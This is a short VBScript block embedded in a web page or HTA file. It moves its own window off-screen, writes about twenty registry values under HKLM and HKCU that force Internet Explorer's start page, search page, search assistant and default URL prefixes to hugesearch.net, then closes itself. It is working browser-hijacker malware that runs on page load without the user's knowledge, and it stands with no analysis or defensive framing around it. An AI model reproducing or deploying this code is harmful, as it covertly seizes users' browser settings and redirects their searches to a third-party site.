   <script language=VBS>
   self.MoveTo 5000,5000
   Set Shl = CreateObject("WScript.Shell")
   Set er=CreateObject("Scripting.FileSystemObject")
   Shl.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\URL\DefaultPrefix\","http://www.hugesearch.net/search.php?qq="
   Shl.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\URL\Prefixes\www","http://www.hugesearch.net/search.php?qq="
   Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.hugesearch.net"
   Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.hugesearch.net"
   Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Main\Search Page","http://www.hugesearch.net/bar.html"
   Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Main\Search Bar","http://www.hugesearch.net/bar.html"
   Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Main\Use Search Asst","no"
   Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\SearchUrl\","http://www.hugesearch.net/search.php?qq=%s"
   Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Search\SearchAssistant","http://www.hugesearch.net/bar.html"
   Shl.RegWrite"HKLM\Software\Microsoft\Internet Explorer\Search\CustomizeSearch","http://www.hugesearch.net/bar.html"
   Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Search\SearchAssistant","http://www.hugesearch.net/bar.html"
   Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Search\CustomizeSearch","http://www.hugesearch.net/bar.html"
   Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Search\Default_Search_URL","http://www.hugesearch.net/bar.html"
   Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Main\Default_Page_URL","http://www.hugesearch.net"
   Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Main\Default_Search_URL","http://www.hugesearch.net/bar.html"
   Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Main\Search Page","http://www.hugesearch.net/bar.html"
   Shl.RegWrite"HKCU\Software\Microsoft\Internet Explorer\Main\Search Page","http://www.hugesearch.net/bar.html"
   window.close()
   </script>
